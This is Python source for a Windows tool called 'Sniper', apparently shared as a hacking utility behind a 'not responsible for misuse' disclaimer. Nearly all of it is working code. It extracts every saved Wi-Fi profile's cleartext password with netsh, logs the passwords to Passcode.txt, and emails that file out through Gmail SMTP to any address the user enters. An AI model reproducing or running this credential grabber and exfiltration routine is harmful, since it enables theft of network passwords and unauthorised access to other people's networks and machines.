import subprocess
import os 
import sys
import logging
import time
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def clear():
    os.system('cls')

def begin():
    print("Let's Start")   

def warn():
    clear()
    sys.stdout.write(MAGENTA+ '''
                            
                     _.--""--._
                    /  _    _  \\
                _   ( (_\\  /_) )  _
                { \\._\\   /\\   /_./ }
                /_"=-.}______{.-="_\\
                _  _.=("""")=._  _
                (_'"_.-"***"-._"'_)
                {_"            " _}    
                    
        ''' + RED + '''       [ Disclaimer Alert ]''' + YELLOW +  ''' 
        ''' + WHITE + '''   I'm Not Responsible For Misuse ''' + YELLOW + '''
        ''' + WHITE + '''      or Illegal Purposes.''' + YELLOW + '''
        ''' + WHITE + ''' Use it just for''' + RED + ''' WORK''' + WHITE + ''' or ''' + RED + '''EDUCATIONAL''' + WHITE + ''' !
        ''')

def heading():
    clear()
    sys.stdout.write(RED + '''
``   ``   ``  ```  ``   ` _```..```````'''+RED+'''.hh/ ``` `````.----:::--::-  ``   ``   ``   ``  ```  ``   ``` 
  ```  ```  ``   ``  ``` 7xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>``  ```  ```  ```  ``   ``  ```   `
``   ``   ``  ```  ``   `Lxxxxxxx+xxxxxxx++ooo/+oooooooooooooooy> ``   ``   ``  ```  ```  ```  ``` '''+YELLOW+'''
  ```  `.::-------.. ```  -```  -/mmmmmmmmmmmmmm+++oooosoooooooooooo'''+WHITE+'''///////++++++++++++++++++++++//// `'''+YELLOW+'''
`` `Nmmmmmmmmmmmmmmm//` `` `-:/mmmmmmmmmmmmmmmmmmmmmmmmmm'''+WHITE+'''ooooooooooooooooo//::://::::::::::::::::::-`'''+YELLOW+''' 
`` .Nmmmmmmmmmmmmmmmmmm  ``+Nmmmmmmmmmmmmmmmmooooooooo/'''+WHITE+''':::::----::----:..```   ``   ``  ```  ``   ``` '''+YELLOW+'''
  `-Nmmmmmmmmmmmmmmmmmm/:/xxxxx-`/xx`-xxxxxxxx'''+MAGENTA+''' ```  ```  ``   ``   ``  ```  ```  ```  ``   ``  ```   `
`` -Nmmmmmmmmmmmmmmmmmmmmmmm``````.-``..`  ``   ``   ``  ```  ```  ``   ``   ``   ``  ```  ``   ``` 
  `:Nmmmmmmmmmmmmmmmmmmmmmm;`  ``   ``   ``  ```  ```  ``   ``   ``  ```  ```  ```  ``   ``  ```   `
`` .Nmmmmmmmmmmmmmmmmmmmmm; ``   ``  ```  ``   ``   ``  ```  ``   ``   ``   ``   ``  ```  ``   ``` 

                      by:''' + WHITE + ' MrAnonymousOfficial (' + YELLOW + '@mr.anonymous_official' + WHITE + ')\n\t\t\t'
                                        'Instagram (' + YELLOW + 'instagram.com/mr.anonymous_official' +WHITE+ ')\n\t\t\t'    
                                        'Twitter   (' + YELLOW + 'twitter.com/MrAnonymousOfcl' +WHITE+ ')' + '\n''' + END) 
    print ('\n\t\t {0}[{1}M{0}]{1} Send Passcodes to E-Mail   {0}[{1}G{0}]{1} Grab Wi-Fi Password\n\t\t {0}[{1}H{0}]{1} Help\t\t\t{0}[{1}Q{0}]{1} Quit   '.format(YELLOW, WHITE) + '\n')
 

def mailsender():
    clear()
    subject = "Sniper- Grabbed Wi-Fi Passwords"
    body = "This is an email sent from Sniper. Find your grabbed Wi-Fi Passwords in the below attached file. Goodbye. "
    sender_email = input("Enter Your E-Mail ID")
    password = input("Enter Your Password")
    receiver_email = input("Enter the E-mail ID of the Reciever")

    print ('\n')
    print ('[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
    print ('\n   email: ' + sender_email)
    print ('   password: ' + password)
    print ('   recieve in:' + receiver_email) 
    print ('\n[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
    print ('\n')    
    ask = input('These info above are correct? (y/n) :')
    if ask == 'y':
        pass
    else:
        mailsender()

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  

    message.attach(MIMEText(body, "plain"))

    filename = "Passcode.txt"

    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    message.attach(part)
    text = message.as_string()

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)


def passwords():
    clear()
    logging.basicConfig(filename="Passcode.txt", level=logging.DEBUG, format="%(message)s")
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            print(f"{i}:----->{results}")
            logging.info(str(f"{i}------>{results}"))
        except:
            pass


def main():
    clear()
    warn()
    x = input('Do You Agree? (Y/N)')
    if x.upper() == 'Y':
        pass
    else:
        print("Goodbye.....see you next time")
        sys.exit(0)
    begin()
    heading()
    input('Press ENTER Key to Continue')
    while True:
        header = ('{0}SNIPER{1} > {2}'.format(YELLOW, WHITE, END))
        choice = input(header)
        print("You select "+ choice)
        if choice.upper() == "Q" or choice.upper() == 'QUIT':
            clear()
            print("Good bye.......See you Later")
            raise SystemExit
        elif choice.upper() == 'G' or choice.upper() == 'GRAB':
            clear()
            print("Please wait.......Grabbing passwords")
            if(os.path.isfile('Passcode.txt')):
                print("Already File Exists: Do You like to add these details in this file?\n")
                x = input("(Y/n)")
                if x.upper() == 'Y':
                    passwords()
                    print("Succesfully Merged The Details in the file\n")
                else:
                    print("Operation Cancelled\n")
            else:
                passwords()
                print("\n\n\t\t\tYour Requested Wi-Fi Passwords is saved as\n\t\t\t  'Passcode.txt'\n\t\t\tin the same Directory")
        elif choice.upper() == 'M' or choice.upper() == 'MAIL':
            clear()
            print("Please wait.......Starting Mail server")
            time.sleep(2)
            if(os.path.isfile('Passcode.txt')):
                mailsender()
            else:
                passwords()
                mailsender()
        elif choice.upper() == 'H' or choice.upper() == 'HELP':
            clear()
            sys.stdout.write(RED+'''\n\t-----------------------------MANUAL-----------------------------\n
             Command   \t\t\t\tDetails\n'''+MAGENTA+'''
               h'''+BLUE+'''   \t\t\tOpens Manual Page\n'''+MAGENTA+'''
               m'''+BLUE+'''   \t\t\tSends Wi-Fi Passwords to Your E-Mail\n'''+MAGENTA+'''
               g'''+BLUE+'''   \t\t\tGrabs Wi-Fi Passwords\n'''+MAGENTA+'''
               q'''+BLUE+'''   \t\t\tQuits This Application\n'''+MAGENTA+'''
               help'''+BLUE+'''\t\t\tOpens Manual Page\n'''+MAGENTA+'''
               mail'''+BLUE+'''\t\t\tSends Wi-Fi Passwords to Your E-Mail\n'''+MAGENTA+'''
               grab'''+BLUE+'''\t\t\tGrabs Wi-Fi Passwords\n'''+MAGENTA+'''
               quit'''+BLUE+'''\t\t\tQuits This Application\n'''+RED+'''
        ------------------------------******------------------------------\n''')            
        else:
            print("No Command Found. Please Enter the Valid Command\n")

if __name__ == "__main__":
    main()